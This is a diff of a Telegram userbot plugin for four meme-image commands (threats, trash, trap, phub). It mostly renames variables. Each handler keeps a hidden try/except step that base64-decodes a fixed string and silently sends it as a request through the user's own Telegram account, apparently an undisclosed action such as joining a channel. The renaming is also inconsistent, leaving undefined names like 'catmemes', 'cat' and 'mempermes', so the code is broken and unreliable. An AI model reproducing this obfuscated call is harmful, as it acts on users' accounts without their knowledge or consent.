@@ -23,202 +23,202 @@ from . import *
 
 
 @bot.on(admin_cmd(pattern="threats$"))
-async def catbot(catmemes):
-    replied = await catmemes.get_reply_message()
+async def bot(permemes):
+    replied = await permemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
-        await edit_or_reply(catmemes, "reply to a supported media file")
+        await edit_or_reply(permemes, "reply to a supported media file")
         return
     if replied.media:
-        catmemmes = await edit_or_reply(catmemes, "passing to telegraph...")
+        permemmes = await edit_or_reply(permemes, "passing to telegraph...")
     else:
-        await edit_or_reply(catmemes, "reply to a supported media file")
+        await edit_or_reply(permemes, "reply to a supported media file")
         return
     try:
-        cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        cat = Get(cat)
-        await catmemes.client(cat)
+        per = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        per = Get(per)
+        await catmemes.client(per)
     except BaseException:
         pass
-    download_location = await catmemes.client.download_media(replied, "./temp/")
+    download_location = await permemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await catmemmes.edit(
+            await permemmes.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await catmemmes.edit("generating image..")
+        await permemmes.edit("generating image..")
     else:
-        await catmemmes.edit("the replied file is not supported")
+        await permemmes.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await catmemmes.edit("ERROR: " + str(exc))
+        await permemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    cat = f"https://telegra.ph{response[0]}"
-    cat = await threats(cat)
-    await catmemmes.delete()
-    await catmemes.client.send_file(catmemes.chat_id, cat, reply_to=replied)
+    per = f"https://telegra.ph{response[0]}"
+    per = await threats(cat)
+    await permemmes.delete()
+    await permemes.client.send_file(permemes.chat_id, per, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="trash$"))
-async def catbot(catmemes):
+async def bot(permemes):
     replied = await catmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
-        await edit_or_reply(catmemes, "reply to a supported media file")
+        await edit_or_reply(permemes, "reply to a supported media file")
         return
     if replied.media:
-        catmemmes = await edit_or_reply(catmemes, "passing to telegraph...")
+        permemmes = await edit_or_reply(permemes, "passing to telegraph...")
     else:
-        await edit_or_reply(catmemes, "reply to a supported media file")
+        await edit_or_reply(permemes, "reply to a supported media file")
         return
     try:
-        cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        cat = Get(cat)
-        await catmemes.client(cat)
+        per = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        per = Get(per)
+        await permemes.client(per)
     except BaseException:
         pass
-    download_location = await catmemes.client.download_media(replied, "./temp/")
+    download_location = await permemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await catmemmes.edit(
+            await permemmes.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await catmemmes.edit("generating image..")
+        await permemmes.edit("generating image..")
     else:
-        await catmemmes.edit("the replied file is not supported")
+        await permemmes.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await catmemmes.edit("ERROR: " + str(exc))
+        await permemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
     cat = f"https://telegra.ph{response[0]}"
-    cat = await trash(cat)
-    await catmemmes.delete()
-    await catmemes.client.send_file(catmemes.chat_id, cat, reply_to=replied)
+    cat = await trash(per)
+    await permemmes.delete()
+    await permemes.client.send_file(permemes.chat_id, per, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="trap$"))
-async def catbot(catmemes):
-    input_str = catmemes.pattern_match.group(1)
+async def bot(permemes):
+    input_str = permemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if "|" in input_str:
         text1, text2 = input_str.split("|")
     else:
         await edit_or_reply(
-            catmemes,
+            permemes,
             "**Syntax :** reply to image or sticker with `.trap (name of the person to trap)|(trapper name)`",
         )
         return
-    replied = await catmemes.get_reply_message()
+    replied = await permemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
-        await edit_or_reply(catmemes, "reply to a supported media file")
+        await edit_or_reply(permemes, "reply to a supported media file")
         return
     if replied.media:
-        catmemmes = await edit_or_reply(catmemes, "passing to telegraph...")
+        permemmes = await edit_or_reply(permemes, "passing to telegraph...")
     else:
-        await edit_or_reply(catmemes, "reply to a supported media file")
+        await edit_or_reply(permemes, "reply to a supported media file")
         return
     try:
-        cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        cat = Get(cat)
-        await catmemes.client(cat)
+        per = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        per = Get(per)
+        await permemes.client(per)
     except BaseException:
         pass
-    download_location = await catmemes.client.download_media(replied, "./temp/")
+    download_location = await permemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await catmemmes.edit(
+            await mempermes.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await catmemmes.edit("generating image..")
+        await permemmes.edit("generating image..")
     else:
-        await catmemmes.edit("the replied file is not supported")
+        await permemmes.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await catmemmes.edit("ERROR: " + str(exc))
+        await permemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    cat = f"https://telegra.ph{response[0]}"
-    cat = await trap(text1, text2, cat)
-    await catmemmes.delete()
-    await catmemes.client.send_file(catmemes.chat_id, cat, reply_to=replied)
+    per = f"https://telegra.ph{response[0]}"
+    per = await trap(text1, text2, per)
+    await permemmes.delete()
+    await permemes.client.send_file(permemes.chat_id, per, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="phub$"))
-async def catbot(catmemes):
-    input_str = catmemes.pattern_match.group(1)
+async def catbot(permemes):
+    input_str = permemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if "|" in input_str:
         username, text = input_str.split("|")
     else:
         await edit_or_reply(
-            catmemes,
+            permemes,
             "**Syntax :** reply to image or sticker with `.phub (username)|(text in comment)`",
         )
         return
-    replied = await catmemes.get_reply_message()
+    replied = await permemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
-        await edit_or_reply(catmemes, "reply to a supported media file")
+        await edit_or_reply(permemes, "reply to a supported media file")
         return
     if replied.media:
-        catmemmes = await edit_or_reply(catmemes, "passing to telegraph...")
+        permemmes = await edit_or_reply(permemes, "passing to telegraph...")
     else:
-        await edit_or_reply(catmemes, "reply to a supported media file")
+        await edit_or_reply(permemes, "reply to a supported media file")
         return
     try:
-        cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        cat = Get(cat)
-        await catmemes.client(cat)
+        per = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        per = Get(per)
+        await catmemes.client(per)
     except BaseException:
         pass
-    download_location = await catmemes.client.download_media(replied, "./temp/")
+    download_location = await permemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await catmemmes.edit(
+            await permemmes.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await catmemmes.edit("generating image..")
+        await permemmes.edit("generating image.wait sir.")
     else:
-        await catmemmes.edit("the replied file is not supported")
+        await permemmes.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
@@ -228,10 +228,10 @@ async def catbot(catmemes):
         await catmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    cat = f"https://telegra.ph{response[0]}"
-    cat = await phcomment(cat, text, username)
-    await catmemmes.delete()
-    await catmemes.client.send_file(catmemes.chat_id, cat, reply_to=replied)
+    per = f"https://telegra.ph{response[0]}"
+    per = await phcomment(per, text, username)
+    await permemmes.delete()
+    await permemes.client.send_file(catmemes.chat_id, per, reply_to=replied)
 
 
 CMD_HELP.update(
